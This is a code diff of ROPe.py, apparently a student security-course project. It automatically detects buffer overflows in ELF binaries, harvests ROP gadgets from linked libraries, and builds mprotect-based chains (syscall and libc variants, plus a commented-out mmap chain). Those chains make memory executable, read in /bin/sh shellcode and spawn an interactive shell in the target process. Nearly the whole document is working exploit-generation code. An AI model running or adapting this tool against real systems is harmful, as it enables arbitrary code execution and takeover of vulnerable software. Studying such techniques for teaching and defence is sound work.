@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# ROPe.py
-# Return Oriented Programming executor.
-#
-# Developed on Kali Linux 2020.1 x86-64
-#
 # Daniel Calabria
 # 103406017
 # CSE 363 Project
+#
+# ROPe.py
+# Return Oriented Programming executor.
+#
+# Developed on Kali Linux 2020.1 x86-64 w/ libc 2.30-4
 
 
 import os
@@ -34,7 +34,11 @@ EXEC_BINSH64_SC += b"\xcb\x27\x5f\x28\x5b\x65\x8a\xeb\xcb"
 shellcode = EXEC_BINSH64_SC
 
 # Adjust the maximum size of an exploitable buffer to search for
-MAX_BUFFER_SIZE = 5000
+MAX_BUFFER_SIZE = 1024
+
+# Adjust the maximum size of gadgets we examine. The bigger the size, the longer
+# it will take to build the gadget map.
+MAX_GADGET_SIZE = 25
 
 ######################## DO NOT MODIFY BELOW THIS LINE ########################
 PLACEHOLDER = 0xdeadc0de
@@ -44,12 +48,10 @@ libc_addr = None
 buflen = 0
 bufaddr = None
 mprotect_addr = None
-mmap_addr = None
-memcpy_addr = None
 sc_addr = None
-global_null_byte = None
 verbose = False
 disable_exec = False
+disable_file_output = False
 
 # pretty colors
 class Colors:
@@ -61,7 +63,6 @@ class Colors:
     GREY = "\033[0;37m"
     WHITE = "\033[1;37m"
     BOLD = "\033[1m"
-    UNDERLINE = "\033[4m"
     RESET = "\033[0m"
 
 
@@ -129,8 +130,6 @@ def find_buffer_addr(f):
             gcc.kill()
             stdout, stderr = gcc.communicate()
 
-        #bufaddr = process(['./find-vuln-buf']).recvall()
-        #debug(f"Buffer address determined @ {bufaddr}")
         bufproc = subprocess.Popen(["./find-vuln-buf"], stdout=PIPE, stderr=PIPE)
         bufaddr = None
         try:
@@ -169,9 +168,12 @@ def print_gadget(g, g_addr):
 # Looks for usable gadgets in elfname, which is loaded into our target binary at baseaddr
 def build_gadgets(elfname, baseaddr):
     global gadget_map
+    global MAX_GADGET_SIZE
+
     gadgets = {}
 
-    elf = ELF(elfname)
+    elf = ELF(elfname, checksec=False)
+    print(f"{Colors.RESET}{Colors.GREY}Scanning \'{Colors.CYAN}{elfname}{Colors.GREY}\' for gadgets...")
 
     # we're only concerned with executable segments
     for seg in elf.executable_segments:
@@ -185,7 +187,7 @@ def build_gadgets(elfname, baseaddr):
         if ret_count == 0:
             continue
 
-        # split around ret instrs, clamp them to be <= 25 bytes long, and incrementally add unique ones into the gadgets list
+        # split around ret instrs, clamp them to be <= MAX_GADGET_SIZE bytes long, and incrementally add unique ones into the gadgets list
         s_data = data.split(b"\xc3")
         s_offset = 0x0
         for s in s_data:
@@ -194,8 +196,8 @@ def build_gadgets(elfname, baseaddr):
 
             s_len = len(s)
             i = 0
-            if s_len > 25:
-                s_len = 25
+            if s_len > MAX_GADGET_SIZE:
+                s_len = MAX_GADGET_SIZE
 
             while i < s_len:
                 gadgets[baseaddr + s_offset + seg.header.p_offset + i] = s[i:s_len]
@@ -424,7 +426,6 @@ def build_syscall_mprotect(f):
         print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
         return None
 
-    payload = ""
     payload = b'A' * buflen                 # padding
 
     # first the mprotect call to set up the area
@@ -435,11 +436,139 @@ def build_syscall_mprotect(f):
     payload += p64(pop_rsi)            # 2nd arg
     payload += p64(0x1000)             # 4kb (pagesize)
     payload += p64(pop_r12_pr)         # r12 = 7
-    payload += p64(0x7)                # 7
+    payload += p64(0x7)                # R|W|X
     payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
     payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
     payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
     payload += p64(syscall)            # syscall
+
+    # second, we use a read() call to read the shellcode into the buffer
+    payload += p64(xor_rax_rax)        # rax = 0
+    payload += p64(pop_rdi)            # 1st arg
+    payload += p64(0x0)                # fd0 (stdin)
+    payload += p64(pop_rsi)            # 2nd arg
+    payload += p64(sc_addr)            # address to write into
+    payload += p64(pop_r12_pr)         # r12 = 4kb
+    payload += p64(0x1000)             # 4kb
+    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)            # syscall
+
+    # finally, return into the RWX page containing the shellcode
+    payload += p64(sc_addr)            # return into the read shellcode
+
+    return payload
+
+
+# Attempts to build the syscall-mmap chain
+#def build_syscall_mmap(f):
+#    # Here we try to `mmap(ADDR, LENGTH, R|W|X, MAP_SHARED | MAP_ANONYMOUS, FD, OFFSET)` via system call
+#    #                      rdi   rsi     rdx              r10               r8   r9
+#    #                                    0x7    0x01       | 0x20           -1     0    
+#    # rax gets return value of mmap syscall
+#    #
+#    # Followed by a read() into that area
+#    # Followed by a return into that read shellcode
+#
+#    global buflen
+#    global sc_addr
+#    global libc_addr
+#
+#    # Find required gadgets
+#    syscall = find_syscall_ret()
+#    pop_rdi = find_pop_rdi_ret()
+#    pop_rsi = find_pop_rsi_ret()
+#
+#
+#    xor_rax_rax = find_xor_rax_rax_ret()
+#    pop_r12_pr  = find_pop_r12_pr()
+#    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr()
+#
+#    payload  = b'A' * buflen        # padding
+#
+#    # First the mmap call
+#    payload += p64(pop_rdi)         # 1st arg
+#    payload += p64(0x0)             # 0
+#    payload += p64(pop_rsi)         # 2nd arg
+#    payload += p64(0x1000)          # 4kb (pagesize)
+#    payload += p64(pop_r12_pr)      # 
+#    payload += p64(0x7)             # R|W|X
+#    payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
+#    payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
+#    payload += p64(PLACEHOLDER) * 2 # needed for the extra ppr in mov_rdx_r12_ppr
+#
+#    payload += p64(pop_r10)         # 4th arg
+#    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
+#    payload += p64(pop_r8)          # 5th arg
+#    payload += p64(0xffffffff)      # -1
+#    payload += p64(pop_r9)          # 6th arg
+#    payload += p64(0x0)             # 0
+#
+#    # save rax for later
+#
+#    # Then the read call
+#    payload += p64(xor_rax_rax)        # rax = 0
+#    payload += p64(pop_rdi)            # 1st arg
+#    payload += p64(0x0)                # fd0 (stdin)
+#    payload += p64(pop_rsi)            # 2nd arg
+#    payload += p64(sc_addr)            # address to write into
+#    payload += p64(pop_r12_pr)         # r12 = 4kb
+#    payload += p64(0x1000)             # 4kb
+#    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
+#    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
+#    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
+#    payload += p64(syscall)            # syscall
+#
+#    # Then return into the new RWX page
+#    return payload
+
+
+# Attemps to build the libc-mprotect chain
+def build_libc_mprotect(f):
+    # our goal here is to `mprotect(ADDR, LEN, R|W|X)` via library call
+    # followed by a read() into that area
+    # then we return into that area
+
+    global buflen
+    global sc_addr
+    global libc_addr
+    global mprotect_addr
+
+    debug(f"{Colors.RESET}{Colors.GREY}libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")
+    debug(f"{Colors.RESET}{Colors.GREY}mprotect @ {Colors.YELLOW}{hex(mprotect_addr)}{Colors.GREY}")
+
+    syscall = find_syscall_ret() # addr of syscall gadget
+    pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
+    pop_rdi = find_pop_rdi_ret() # 1st arg
+    pop_rsi = find_pop_rsi_ret() # 2nd arg
+    
+    # 3rd arg, need to get 0x7 into rdx by using r12
+    pop_r12_pr = find_pop_r12_pr() # r12 = 7
+    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr() # rdx = r12
+
+    xor_rax_rax = find_xor_rax_rax_ret() # rax = 0
+    add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number
+
+    if syscall is None or pop_rax is None or pop_rdi is None or pop_rsi is None or pop_r12_pr is None or mov_rdx_r12_ppr is None or xor_rax_rax is None or add_rax_1 is None:
+        print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
+        return None
+
+    payload = b'A' * buflen            # padding
+
+    # first the mprotect call to set up the area
+    payload += p64(xor_rax_rax)        # rax = 0
+    payload += p64(add_rax_1) * 10     # rax = 10
+    payload += p64(pop_rdi)            # 1st arg
+    payload += p64(sc_addr)            # address we want to make r/w/x
+    payload += p64(pop_rsi)            # 2nd arg
+    payload += p64(0x1000)             # 4kb (pagesize)
+    payload += p64(pop_r12_pr)         # r12 = 7
+    payload += p64(0x7)                # R|W|X
+    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
+    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
+    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
+    payload += p64(mprotect_addr)      # mprotect()
 
     # second, we use a read() call to read the shellcode into the buffer
     payload += p64(xor_rax_rax)        # rax = 0
@@ -468,10 +597,7 @@ def build_chain(filename):
     global buflen
     global bufaddr
     global mprotect_addr
-    global mmap_addr
-    global memcpy_addr
     global sc_addr
-    global global_null_byte
     global disable_exec
 
     # reset to defaults, in case this is for a non-first binary
@@ -481,15 +607,11 @@ def build_chain(filename):
     buflen = 0
     bufaddr = None
     mprotect_addr = None
-    mmap_addr = None
-    memcpy_addr = None
     sc_addr = None
-    global_null_byte = None
 
     print(f"{Colors.BOLD}{Colors.WHITE}Attempting to build ROP chain for \'{Colors.YELLOW}{filename}{Colors.WHITE}\'{Colors.RESET}{Colors.GREY}")
 
-    elf = ELF(filename)
-
+    elf = ELF(filename, checksec=False)
 
     # What libraries is this linked against?
     # Herein we look for libc so we can update the libc base address (req'd for the libc calls above)
@@ -510,20 +632,14 @@ def build_chain(filename):
                     sc_addr = elf.libs[libname] + addr
                     debug(f"targetting address for mprotect {hex(sc_addr)}")
 
-        # Find a NULL byte, in case we need to use it later, since we won't be able to put NULLs in the payload
-        # we'll need to copy one from somewhere else
-        if global_null_byte is None:
-            le = ELF(libname)
-            has_null = list(le.search(b'\x00'))
-            if has_null is not None:
-                debug(f"NULL found @ {has_null[-1]}")
-                global_null_byte = elf.libs[libname] + has_null[-1]
-
         # is it libc? update the libc base addr
-        is_libc = re.search('/libc-*.*.so$', libname)
-        if is_libc is not None:
+        if '/libc.' in libname or '/libc-' in libname:
+            has_libc = True
             libc_addr = elf.libs[libname]
             debug(f"libc base address @ {hex(libc_addr)}")
+            libc = ELF(libname, checksec=False)
+            mprotect_addr = libc_addr + libc.symbols['mprotect']
+            debug(f"libc mprotect addr @ {hex(mprotect_addr)}")
 
         # Build the collection of gadgets
         build_gadgets(libname, elf.libs[libname])
@@ -535,7 +651,7 @@ def build_chain(filename):
     if buflen <= 0:
         print(f"{Colors.BOLD}{Colors.YELLOW}{filename}{Colors.WHITE} does not appear to be vulnerable.")
         return None
-    debug(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")
+    print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")
 
     # Determines the address of the buffer in memory
     bufaddr = find_buffer_addr(filename)
@@ -543,44 +659,62 @@ def build_chain(filename):
         print(f"{Colors.BOLD}{Colors.YELLOW}Unable to determine buffer address.{Colors.GREY}{Colors.RESET}")
         return None
 
-    # get the addresses of the functions needed in libc
-    if elf.libc is None:
-        debug("ELF does not import libc.")
-        has_libc = False
-
-    if has_libc is True:
-        libc = elf.libc
-        mprotect_addr = libc_addr + libc.symbols['mprotect']
-        mmap_addr = libc_addr + libc.symbols['mmap']
-        memcpy_addr = libc_addr + libc.symbols['memcpy']
-        debug(f"libc mprotect addr @ {hex(mprotect_addr)}")
-        debug(f"libc mmap addr @ {hex(mmap_addr)}")
-        debug(f"libc memcpy addr @ {hex(memcpy_addr)}")
-
     # Try syscall-mprotect chain
     print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mprotect{Colors.GREY} chain...")
     res = build_syscall_mprotect(filename)
     if res is not None:
-        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed syscall-mprotect chain...{Colors.GREY}{Colors.RESET}")
-
+        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
+        if disable_file_output is False:
+            fn = filename[filename.rfind("/")+1:]
+            write_payload(f"{fn}-syscall-mprotect-payload.ROPe", res)
         if disable_exec is False:
-            print(f"{Colors.BOLD}{Colors.WHITE}*** Executing {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
-            p = process([filename])
-            p.sendline(bytes(res))
-            p.sendline(bytes(shellcode))
-            p.interactive()
-            p = subprocess.Popen([filename])
-        else:
-            write_payload(f"ROPe-syscall-mprotect-payload", res)
+            try:
+                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
+                p = process([filename])
+                p.sendline(bytes(res))
+                p.sendline(bytes(shellcode))
+                p.interactive()
+                p.close()
+            except Exception as err:
+                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
 
-        #p = subprocess.Popen([filename], stdin=PIPE)
-        #p.communicate(input=bytes(res))
-        #p.communicate(input=bytes(shellcode))
 
-        return
+
+    # Try libc-mprotect chain
+    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mprotect{Colors.GREY} chain...")
+    res = None
+    if has_libc is True:
+        res = build_libc_mprotect(filename)
+    else:
+        print(f"{Colors.BOLD}{Colors.RED}libc not found! Skipping chain...{Colors.RESET}{Colors.GREY}")
+    if res is not None:
+        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}libc-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
+        if disable_file_output is False:
+            fn = filename[filename.rfind("/")+1:]
+            write_payload(f"{fn}-libc-mprotect-payload.ROPe", res)
+        if disable_exec is False:
+            try:
+                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
+                p = process([filename])
+                p.sendline(bytes(res))
+                p.sendline(bytes(shellcode))
+                p.interactive()
+                p.close()
+            except Exception as err:
+                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
 
     # Try syscall-mmap chain
-    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap{Colors.GREY} chain...")
+    #print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap{Colors.GREY} chain...")
+    #res = build_syscall_mmap(filename)
+    #if res is not None:
+    #    print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mmap{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
+    #    write_payload(f"ROPe-syscall-mprotect-payload", res)
+    #    if disable_exec is False:
+    #        print(f"{Colors.BOLD}{Colors.WHITE}*** Executing {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
+    #        p = process([filename])
+    #        p.sendline(bytes(res))
+    #        p.sendline(bytes(shellcode))
+    #        p.interactive()
 
 
 # Prints out the generated payload in a human-readable format (hex-encoded string)
@@ -596,7 +730,8 @@ def ROPe():
     # parse arguments
     parser = argparse.ArgumentParser(description="Automatically generate a ROP chain suitable for executing a third party payload.")
     parser.add_argument('-v', action='store_true', help='enable verbose output')
-    parser.add_argument('-n', action='store_true', help='do not attempt to launch process with ROP payload')
+    parser.add_argument('-x', action='store_true', help='do not attempt to launch process with ROP payload')
+    parser.add_argument('-d', action='store_true', help='do not write generated payloads out as files')
     parser.add_argument('files', nargs='+', help='list of ELFs to examine (must be in $PATH, or absolute paths)')
     args = parser.parse_args()
 
@@ -605,10 +740,15 @@ def ROPe():
         verbose = True
         debug("verbose: True")
 
-    if args.n:
+    if args.x:
         global disable_exec
         disable_exec = True
         debug("disable_exec: True")
+
+    if args.d:
+        global disable_file_output
+        disable_file_output = True
+        debug("disable_file_output: True")
 
     if args.files:
         global files
